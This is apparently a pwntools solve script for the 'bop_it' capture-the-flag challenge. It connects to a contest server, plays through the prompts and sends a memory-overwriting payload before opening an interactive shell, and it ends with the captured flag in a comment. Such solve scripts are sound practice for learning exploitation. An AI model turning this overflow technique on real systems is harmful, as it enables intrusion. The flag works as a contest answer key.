from pwn import *


binpath = './bop_it'
elf = ELF(binpath)


context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
# context.log_level = 'DEBUG'


gdbscript = '''
gef
# read
b *0x5555555553ac
# strncmp
b *0x555555555446
# sub rsp, rax
b *0x5555555554a3
c
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('shell.actf.co', 20702)

while True:
    data = io.recvline()
    if chr(data[0]) == 'F':
        break
    else:
        io.sendline(chr(data[0]))


payload = p64(0)
payload += b'A' * 0xf8
io.sendline(payload)
data = io.recvline()
print(data)


io.interactive()


# actf{bopp1ty_bop_bOp_b0p}
